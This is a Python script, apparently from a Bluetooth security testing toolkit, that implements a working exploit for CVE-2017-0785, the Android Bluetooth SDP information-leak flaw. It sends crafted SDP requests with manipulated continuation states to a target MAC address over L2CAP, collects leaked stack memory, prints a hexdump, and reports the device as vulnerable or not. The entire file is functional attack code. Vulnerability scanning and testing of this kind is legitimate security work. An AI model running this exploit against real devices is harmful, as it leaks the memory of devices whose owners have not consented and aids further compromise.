from pwn import *
import bluetooth
import argparse

from bluekit.report import report_vulnerable, report_not_vulnerable, report_error
from bluekit.constants import LOG_FILE


def packet(service, continuation_state):
    pkt = b'\x02\x00\x00'
    pkt += p16(7 + len(continuation_state))
    pkt += b'\x35\x03\x19'
    pkt += p16(service)
    pkt += b'\x01\x00'
    pkt += continuation_state
    return pkt


def exploit_cve_2017_0785(target: str):
    service_long = 0x0100
    service_short = 0x0001
    mtu = 50
    n = 30
    p = log.progress('Exploit')
    p.status('Creating L2CAP socket')
    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, mtu)
    context.endian = 'big'
    p.status('Connecting to target')
    sock.connect((target, 1))
    p.status('Sending packet 0')
    sock.send(packet(service_long, b'\x00'))
    data = sock.recv(mtu)
    if data[-3] != ord(b'\x02'):
        log.error('Invalid continuation state received.')
    stack = b''
    for i in range(1, n):
        p.status('Sending packet %d' % i)
        sock.send(packet(service_short, data[-3:]))
        data = sock.recv(mtu)
        stack += data[9:-3]
    sock.close()
    p.success('Done')
    print(hexdump(stack))

    if len(stack) > 0:
        report_vulnerable(hexdump(stack))
    else:
        report_not_vulnerable(hexdump(stack))

    print(len(stack))


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target',required=False, type=str, help="target MAC address")
    args = parser.parse_args()
    try:
        if args.target:
            exploit_cve_2017_0785(args.target)
    except Exception as e:
        if str(e) == "Invalid continuation state received.":
            report_not_vulnerable("Target device OS is not Android")
        else:
            report_error(str(e))
